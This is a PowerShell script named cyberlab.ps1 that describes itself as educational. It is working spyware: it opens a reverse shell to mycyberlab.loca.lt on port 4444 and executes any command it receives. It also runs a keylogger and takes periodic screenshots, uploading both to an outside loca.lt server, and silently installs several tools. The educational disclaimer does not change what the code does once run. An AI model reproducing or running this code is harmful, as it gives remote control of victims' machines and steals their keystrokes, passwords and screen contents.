# cyberlab.ps1 - Professional Grade Script
# ===========================================
# This script establishes a reverse shell, logs keystrokes, captures screenshots,
# uploads logs and screenshots to a specified server, and installs specified tools.
# It is designed for educational purposes and should only be used on systems you own or have permission to test.

# -------------------------------
# Configuration Section
# -------------------------------
# Directory for logs and tools
$workingDir = "C:\Cyberlab"
New-Item -ItemType Directory -Path $workingDir -Force | Out-Null

# -------------------------------
# Function: Reverse Shell
# -------------------------------
function Start-ReverseShell {
    try {
        # Connect to the specified LocalTunnel URL for reverse shell
        $client = New-Object System.Net.Sockets.TCPClient("mycyberlab.loca.lt", 4444)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | %{0}
        $sendback2 = "Connected to Cyberlab`nPS " + (Get-Location).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
        Start-Sleep -Milliseconds 500

        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (Invoke-Expression $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Write-Host "Reverse shell connection failed: $_"
    }
}

# -------------------------------
# Function: Keystroke Logging
# -------------------------------
function Start-KeyLogger {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Keyboard {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int vKey);
    }
    "@
    $logfile = "$workingDir\keystrokes.log"
    while ($true) {
        Start-Sleep -Milliseconds 100
        for ($i = 0; $i -lt 255; $i++) {
            if ([Keyboard]::GetAsyncKeyState($i) -eq -32767) {
                $key = [char]$i
                $key | Out-File -FilePath $logfile -Append
            }
        }
        Start-Sleep -Seconds 60
        try {
            # Upload keystroke log to the specified LocalTunnel URL
            Invoke-WebRequest -Uri "https://mycyberlab-upload.loca.lt:8080/upload" -Method POST -InFile $logfile -ErrorAction SilentlyContinue
        } catch {
            Write-Host "Keystroke log upload failed: $_"
        }
    }
}

# -------------------------------
# Function: Screenshot Capture
# -------------------------------
function Start-ScreenCapture {
    Add-Type -AssemblyName System.Windows.Forms
    while ($true) {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
        $filename = "$workingDir\screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png"
        $bitmap.Save($filename)
        try {
            # Upload screenshot to the specified LocalTunnel URL
            Invoke-WebRequest -Uri "https://mycyberlab-upload.loca.lt:8080/upload" -Method POST -InFile $filename -ErrorAction SilentlyContinue
        } catch {
            Write-Host "Screenshot upload failed: $_"
        }
        Remove-Item $filename
        Start-Sleep -Seconds 300  # Every 5 minutes
    }
}

# -------------------------------
# Function: Install Tools
# -------------------------------
function Install-Tools {
    try {
        # Wireshark
        Invoke-WebRequest -Uri "https://2.na.dl.wireshark.org/win64/Wireshark-latest-x64.exe" -OutFile "$workingDir\wireshark.exe"
        Start-Process -FilePath "$workingDir\wireshark.exe" -ArgumentList "/S" -Wait
    } catch {
        Write-Host "Wireshark installation failed: $_"
    }
    try {
        # Burp Suite
        Invoke-WebRequest -Uri "https://portswigger.net/burp/releases/download?type=Jar" -OutFile "$workingDir\burpsuite.jar"
    } catch {
        Write-Host "Burp Suite download failed: $_"
    }
    try {
        # MetaTrader 5
        Invoke-WebRequest -Uri "https://download.mql5.com/cdn/web/metaquotes.software.corp/mt5/mt5setup.exe" -OutFile "$workingDir\mt5setup.exe"
        Start-Process -FilePath "$workingDir\mt5setup.exe" -ArgumentList "/auto" -Wait
    } catch {
        Write-Host "MetaTrader 5 installation failed: $_"
    }
    try {
        # Kali Linux via WSL
        wsl --install -d kali-linux --no-launch
    } catch {
        Write-Host "Kali Linux WSL installation failed: $_"
    }
}

# -------------------------------
# Main Script Execution
# -------------------------------
# Start reverse shell in a background job
$reverseShellJob = Start-Job -ScriptBlock {
    Start-ReverseShell
}

# Start keystroke logger in a background job
$keylogJob = Start-Job -ScriptBlock {
    Start-KeyLogger
}

# Start screenshot capture in a background job
$screenshotJob = Start-Job -ScriptBlock {
    Start-ScreenCapture
}

# Install tools
Install-Tools

# Wait for the reverse shell job to keep the script running
Wait-Job -Job $reverseShellJob
